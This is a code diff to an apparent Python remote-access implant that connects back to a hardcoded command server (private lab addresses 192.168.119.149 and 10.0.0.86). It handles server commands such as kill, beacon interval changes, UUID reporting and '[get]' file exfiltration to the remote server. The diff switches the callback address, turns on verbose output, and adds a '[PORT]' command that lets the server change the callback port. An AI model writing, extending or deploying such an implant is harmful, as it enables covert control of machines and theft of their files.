@@ -14,11 +14,11 @@ if name  == "nt":
     if winreg_exists:
         import winreg
 
-UUID = "67cf26b8-9942-11ea-a2db-bc14ef68ef25"   #python -c 'import uuid; print(uuid.uuid1())'
-remote_ip = '192.168.119.149'
-remote_port = 443
+UUID = "c60a59df-c3e1-11ea-a17a-bc14ef68ef25"   #python -c 'import uuid; print(uuid.uuid1())'
+remote_ip = '10.0.0.86'
+remote_port = 8081
 server_sni_hostname = ''
-VERBOSE = False
+VERBOSE = True
 DEVNULL = subprocess.DEVNULL
 BEACON_INTERVAL_DEFAULT = 30    #in seconds
 BEACON_INTERVAL_MEM = None
@@ -193,7 +193,20 @@ def kill_term(conn):
         print_warn("Received kill command")
     conn.close()
     kill(getpid(), SIGTERM)
-    
+
+def callback_port(conn,data):
+    global remote_port
+    temp = data.strip("[PORT]")
+    if temp == "?":
+        send_data(conn,remote_port)
+    else:
+        try:
+            if int(temp) > 0 and int(temp) < 65536:
+                remote_port = int(temp)
+        except Exception as e:
+            if VERBOSE:
+                print_fail("Unable to change callback port")
+                print(e)
 
 def connect(remote_ip=remote_ip, remote_port=remote_port):
 
@@ -245,6 +258,8 @@ def connect(remote_ip=remote_ip, remote_port=remote_port):
             break
         elif "[BEACON]" in data:
             beacon(conn, data)
+        elif "[PORT]" in data:
+           callback_port(conn,data)
         elif "[UUID]" in data:
             push_uuid(conn)
         elif "[get]" in data:  #find file locally then push to remote server
@@ -320,6 +335,7 @@ def beacon_drift(value=30):
     new_interval = randint(left_bound, right_bound)
     if VERBOSE:
         print_info("New Beacon Value is: {} seconds".format(new_interval))
+        print_info("REMOTE_HOST: {}:{}".format(remote_ip,remote_port))
     return new_interval
 
 def main ():
